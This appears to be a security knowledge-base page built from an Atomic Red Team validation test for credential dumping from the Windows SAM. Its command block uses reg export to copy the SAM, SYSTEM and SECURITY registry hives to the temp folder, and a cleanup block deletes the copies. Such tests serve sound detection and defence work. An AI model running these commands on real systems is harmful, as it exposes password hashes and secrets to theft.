---
atomic_guid: "21df41be-cdd8-4695-a650-c3981113aa3c"
title: "Dumping of SAM, creds, and secrets(Reg Export)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.002"
attack_technique_name: "OS Credential Dumping: Security Account Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml"
build_date: "2026-04-27 19:12:25"
executor: "command_prompt"
aliases:
  - "21df41be-cdd8-4695-a650-c3981113aa3c"
  - "Dumping of SAM, creds, and secrets(Reg Export)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping#^t1003002-security-account-manager|T1003.002: Security Account Manager]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg export HKLM\sam %temp%\sam
reg export HKLM\system %temp%\system
reg export HKLM\security %temp%\security
```

### Cleanup

```cmd
del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.yaml)
